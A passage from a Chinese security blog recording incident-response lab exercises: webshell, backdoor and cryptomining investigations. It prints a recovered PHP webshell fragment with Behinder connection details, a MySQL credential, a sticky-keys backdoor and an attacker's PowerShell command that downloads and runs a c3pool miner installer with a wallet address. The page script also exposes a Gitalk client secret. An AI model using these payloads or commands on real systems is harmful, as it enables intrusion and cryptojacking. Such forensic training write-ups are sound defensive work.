  <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span>=realpath(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="variable">@chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="variable">@ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="variable">$cntarr</span>=<span class="variable">@preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;sizeof(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">@chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        <span class="variable">@ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="variable">@rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc(<span class="variable">$out</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo <span class="string">&quot;4a0c&quot;</span>.<span class="string">&quot;dc70&quot;</span>;</span><br><span class="line">    echo <span class="variable">@asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    echo <span class="string">&quot;db6&quot;</span>.<span class="string">&quot;da5&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    <span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>)<span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">    <span class="variable">$R</span>=<span class="string">&quot;&#123;<span class="variable">$D</span>&#125;    &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)as <span class="variable">$L</span>)<span class="keyword">if</span>(is_dir(<span class="string">&quot;&#123;<span class="variable">$L</span>&#125;:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;&#123;<span class="variable">$L</span>&#125;:&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;   &quot;</span>;</span><br><span class="line">    <span class="variable">$u</span>=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?<span class="variable">@posix_getpwuid</span>(<span class="variable">@posix_geteuid</span>()):<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:<span class="variable">@get_current_user</span>();</span><br><span class="line">    <span class="variable">$R</span>.=php_uname();</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;   &#123;<span class="variable">$s</span>&#125;&quot;</span>;</span><br><span class="line">    echo <span class="variable">$R</span>;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">这个是冰蝎webshell的连接URL是：index.php?user-app-register  webshell连接密码是：Network2020</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST了一个<span class="keyword">version</span>2.php，此时回想起<span class="keyword">history</span>命令得到的结果中显示了删除<span class="keyword">version</span>2.php的命令记录，<span class="keyword">version</span>2.php应该是木马文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117225528325.png" alt="image-20250117225528325"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看开放的服务有哪些：</span><br><span class="line">./whoamifuck.sh -x</span><br><span class="line">开了mysql,php-fpm,nginx</span><br><span class="line">查看nginx日志<span class="built_in">cat</span> /www/wwwlogs/access.log /www/wwwlogs目录下有许多日志文件</span><br><span class="line">请求的是phpmyadmin应该是用的扫描器,另外应该有配置文件config.inc.php里面有mysql的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117215618956.png" alt="image-20250117215618956"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/www/</span>backup<span class="regexp">/file_history/</span>www<span class="regexp">/wwwroot/</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/lib/</span>config.inc.php/<span class="number">1709784387</span>下面有mysql的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117221506055.png" alt="image-20250117221506055"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot 始终登不上去,查了官方wp发现是mysql -ukaoshi -p5Sx8mK5ieyLPb84m</span><br><span class="line">mysqldump -u kaoshi -<span class="selector-tag">p</span>  <span class="attr">--all-databases</span> &gt; all_databases_backup<span class="selector-class">.sql</span> 打包数据库到本地看看但是没有权限不让打包,只能一个个找</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117224636707.png" alt="image-20250117224636707"></p>
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117224730467.png" alt="image-20250117224730467"></p>
+<h1 id="近源渗透OS-1"><a href="#近源渗透OS-1" class="headerlink" title="近源渗透OS-1"></a>近源渗透OS-1</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.攻击者的外网<span class="built_in">IP</span>地址</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.攻击者的内网跳板<span class="built_in">IP</span>地址</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.攻击者使用的限速软件的md5大写</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.攻击者的后门md5大写</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.攻击者留下的flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把文件都放到沙箱里跑一遍,发现放假通知那个文件有点问题找到了外联<span class="built_in">IP</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118070050038.png" alt="image-20250118070050038"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显示隐藏文件发现多了一个bat文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118070512541.png" alt="image-20250118070512541"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这应该是一个<span class="keyword">cs</span>马</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118070605100.png" alt="image-20250118070605100"></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现在局域网用的p2p工具,搜索发现这个工具有限速功能</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118070849535.png" alt="image-20250118070849535"></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在<span class="keyword">system</span>目录下发现<span class="keyword">shift</span>后门</span><br><span class="line">C:\Windows\System32\sethc.exe</span><br><span class="line">连按<span class="number">5</span>次<span class="keyword">shift</span>系统会运行粘滞键</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118071042610.png" alt="image-20250118071042610"></p>
+<h1 id="Windows挖矿事件"><a href="#Windows挖矿事件" class="headerlink" title="Windows挖矿事件"></a>Windows挖矿事件</h1><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">攻击者的IP地址</span><br><span class="line"></span><br><span class="line">攻击者开始攻击的时间</span><br><span class="line"></span><br><span class="line">攻击者攻击的端口</span><br><span class="line"></span><br><span class="line">挖矿程序的<span class="built_in">md5</span></span><br><span class="line"></span><br><span class="line">后门脚本的<span class="built_in">md5</span></span><br><span class="line"></span><br><span class="line">矿池地址</span><br><span class="line"></span><br><span class="line">钱包地址</span><br><span class="line"></span><br><span class="line">攻击者是如何攻击进入的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">刚登陆上就发现进程满了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118072304035.png" alt="image-20250118072304035"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传火绒剑,在启动项发现异常文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118072613365.png" alt="image-20250118072613365"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">powershell</span> -Command <span class="string">&quot;<span class="variable">$wc</span> = New-Object System.Net.WebClient; <span class="variable">$tempfile</span> = [System.IO.Path]::GetTempFileName(); <span class="variable">$tempfile</span> += &#x27;.bat&#x27;; <span class="variable">$wc</span>.DownloadFile(&#x27;https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat&#x27;, <span class="variable">$tempfile</span>); &amp; <span class="variable">$tempfile</span> 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y; Remove-Item -Force <span class="variable">$tempfile</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其中c<span class="number">3</span>pool.org是矿池;</span><br><span class="line"><span class="number">4</span>APXVhukG<span class="symbol">NiR5</span>kqq<span class="attr">VC7</span>jwiVaa<span class="number">5</span>jDxUgPohEtAyuRS<span class="number">1</span>uyeL<span class="number">6</span>K<span class="number">1</span>LkkBy<span class="number">9</span>SKx<span class="number">5</span>W<span class="number">1</span><span class="name">M7</span>gYy<span class="symbol">Nneusud6</span>A<span class="number">8</span>hKjJCtVbeoFARuQTu<span class="number">4</span>Y是钱包地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118072916410.png" alt="image-20250118072916410"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还很逼真,还有人真的提现,打完靶机赶紧删了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250118073239349.png" alt="image-20250118073239349"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在系统登录失败日志中发现新信息</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02/">内网渗透-三层网络渗透学习2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
